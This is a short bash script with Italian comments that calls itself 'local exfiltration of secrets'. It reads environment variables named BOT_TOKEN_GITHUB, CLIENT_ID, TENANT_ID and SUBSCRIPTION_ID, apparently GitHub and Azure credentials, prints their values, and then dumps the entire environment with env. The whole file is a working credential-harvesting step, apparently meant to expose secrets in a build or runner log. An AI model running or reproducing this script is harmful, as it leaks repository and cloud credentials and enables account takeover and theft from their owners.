#!/bin/bash

echo "[*] Avvio esfiltrazione locale dei secrets..."

# Greppa direttamente i segreti noti
for var in BOT_TOKEN_GITHUB CLIENT_ID TENANT_ID SUBSCRIPTION_ID; do
  val=$(printenv $var)
  echo "[+] $var = $val"
done

# Dump completo
echo "[*] Dump completo delle env:"
env